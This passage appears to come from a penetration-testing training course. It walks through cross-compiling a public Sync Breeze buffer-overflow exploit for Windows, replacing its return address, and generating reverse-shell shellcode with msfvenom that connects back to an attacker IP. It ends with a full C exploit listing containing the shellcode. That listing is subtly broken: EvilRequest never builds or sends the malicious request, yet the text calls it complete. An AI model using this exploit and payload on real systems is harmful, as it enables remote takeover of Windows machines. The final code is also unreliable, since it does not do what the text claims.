# Cross-Compiling and Adjusting Exploit Code for Windows

## 14.1.3 Cross-Compiling Exploit Code

### Introduction
To avoid compilation issues, it is generally recommended to use native compilers for the specific operating system targeted by the code. However, this may not always be an option. In some scenarios, we might only have access to a single attack environment (like Kali), but need to leverage an exploit coded for a different platform. In such cases, a cross-compiler can be extremely helpful.

### Using mingw-w64
We will use the popular `mingw-w64` cross-compiler in this section. If itâ€™s not already present, we can install it using `apt`.

```bash
kali@kali:~$ sudo apt install mingw-w64
```

### Compiling the Code
We can use `mingw-w64` to compile the code into a Windows Portable Executable (PE) file. The first step is to determine if the exploit code compiles without errors. We can do this by invoking the cross-compiler, passing the C source file as the first argument and the output PE file name as the second argument, prepended by the `-o` parameter.

```bash
kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```

If the compilation fails with undefined references, it likely means that the linker cannot find the necessary libraries. For example, the following errors indicate missing Winsock functions:

```bash
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
...
```

To resolve these errors, add the `-lws2_32` parameter to the `i686-w64-mingw32-gcc` command to link the Winsock library.

```bash
kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

### Verifying the Compilation
After adjusting the command, the compilation should succeed, and you should see the executable file in the directory.

```bash
kali@kali:~$ ls -lah
total 372K
drwxr-xr-x 2 root root 4.0K Feb 24 17:13 .
drwxr-xr-x 17 root root 4.0K Feb 24 15:42 ..
-rw-r--r-- 1 root root 4.7K Feb 24 15:46 42341.c
-rwxr-xr-x 1 root root 355K Feb 24 17:13 syncbreeze_exploit.exe
```

### 14.1.4 Fixing the Exploit

#### Identifying Hard-Coded Values
Inspect the C code to identify hard-coded values for the IP address and port fields:

```c
printf("[>] Socket created.\n");
server.sin_addr.s_addr = inet_addr("10.11.0.22");
server.sin_family = AF_INET;
server.sin_port = htons(80);
```

These values will need to be adjusted in the exploit.

#### Updating the Return Address
Further inspection of the C code reveals the use of a return address located in the Visual Basic 6.0 runtime `msvbvm60.dll`, which is not part of the vulnerable software. To verify this, start the Sync Breeze Service on the Windows 10 client and attach Immunity Debugger to the `syncbrs` process. Check the loaded modules to confirm that `msvbvm60.dll` is absent.

Given that the Python version of the exploit is marked as EDB Verified, we can replace the target return address with the one contained in that version:

```c
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
```

#### Generating Shellcode
The shellcode variable includes a NOP slide before the actual payload. Since bad characters are already listed in the Python exploit, we can generate our own payload with `msfvenom`, targeting the x86 platform and formatting it for C code:

```bash
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

### Final Code
After making the above-mentioned changes, the final exploit code appears as follows:

```c
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512
#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }
    printf("[>] Initialised.\n");

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("[!] Could not create socket : %d", WSAGetLastError());
        return 1;
    }
    printf("[>] Socket created.\n");

    server.sin_addr.s_addr = inet_addr("192.168.50.120");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[!] Connect failed : %d", WSAGetLastError());
        closesocket(s);
        return 1;
    }
    printf("[>] Connected\n");

    if (send(s, request, request_size, 0) == SOCKET_ERROR) {
        printf("[!] Send failed : %d", WSAGetLastError());
        closesocket(s);
        return 1;
    }
    printf("[>] Request sent\n");

    closesocket(s);
    return 0;
}

void EvilRequest() {
    char request_one[] = "POST /login HTTP/1.1\r\n"
                         "Host: 192.168.50.120\r\n"
                         "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                         "Accept-Language: en-US,en;q=0.5\r\n"
                         "Referer: http://192.168.50.120/login\r\n"
                         "Connection: close\r\n"
                         "Content-Type: application/x-www-form-urlencoded\r\n"
                         "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";
    int initial_buffer_size = 780;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
    unsigned char shellcode[] =
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
        "\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
        "\x52\x31\x72\x17\x83\xc2\x04\x03\xd7\xdf\xca\x6c\xeb\x08\x88"
        "\x8f\x13\xc9\xed\x06\xf6\xf8\x2d\x7c\x73\xaa\x9d\xf6\xd1\x47"
        "\x55\x5a\xc1\xdc\x1b\x73\xe6\x55\x91\xa5\xc9\x66\x8a\x96\x48"
        "\xe5\xd1\xca\xaa\xd4\x19\x1f\xab\x11\x47\xd2\xf9\xca\x03\x41"
        "\xed\x7f\x59\x5a\x86\xcc\x4f\xda\x7b\x84\x6e\xcb\x2a\x9e\x28"
        "\xcb\xcd\x73\x41\x42\xd5\x90\x6c\x1c\x6e\x62\x1a\x9f\xa6\xba"
        "\xe3\x0c\x87\x72\x16\x4c\xc0\xb5\xc9\x3b\x38\xc6\x74\x3c\xff"
        "\xb4\xa2\xc9\x1b\x1e\x20\x69\xc7\x9e\xe5\xec\x8c\xad\x42\x7a"
        "\xca\xb1\x55\xaf\x61\xcd\xde\x4e\xa5\x47\xa4\x74\x61\x03\x7e"
        "\x14\x30\xe9\xd1\x29\x22\x52\x8d\x8f\x29\x7f\xda\xbd\x70\xe8"
        "\x2f\x8c\x8a\xe8\x27\x87\xf9\xda\xe8\x33\x95\x56\x60\x9a\x62"
        "\x98\x5b\x5a\xfc\x67\x64\x9b\xd5\xa3\x30\xcb\x4d\x05\x39\x80"
        "\x8d\xaa\xec\x07\xdd\x04\x5f\xe8\x8d\xe4\x0f\x80\xc7\xea\x70"
        "\xb0\xe8\x20\x19\x5b\x13\xa3\xe6\x34\x29\x37\x8f\x46\x4d\x36"
        "\xf4\xce\xab\x52\x1a\x87\x64\xcb\x83\x82\xfe\x6a\x4b\x19\x7b"
        "\xac\xc7\xae\x7c\x63\x20\xda\x6e\x14\xc0\x91\xcc\xb3\xdf\x0f"
        "\x78\x5f\x4d\xd4\x78\x16\x6e\x43\x2f\x7f\x40\x9a\xa5\x6d\xfb"
        "\x34\xdb\x6f\x9d\x7f\x5f\xb4\x5e\x81\x5e\x39\xda\xa5\x70\x87"
        "\xe3\xe1\x24\x57\xb2\xbf\x92\x11\x6c\x0e\x4c\xc8\xc3\xd8\x18"
        "\x8d\x2f\xdb\x5e\x92\x65\xad\xbe\x23\xd0\xe8\xc1\x8c\xb4\xfc"
        "\xba\xf0\x24\x02\x11\xb1\x45\xe1\xb3\xcc\xed\xbc\x56\x6d\x70"
        "\x3f\x8d\xb2\x8d\xbc\x27\x4b\x6a\xdc\x42\x4e\x36\x5a\xbf\x22"
        "\x27\x0f\xbf\x91\x48\x1a";

    char request_three[] = "&password=A";
}
```

This completes the process of cross-compiling and adjusting the exploit code for Windows.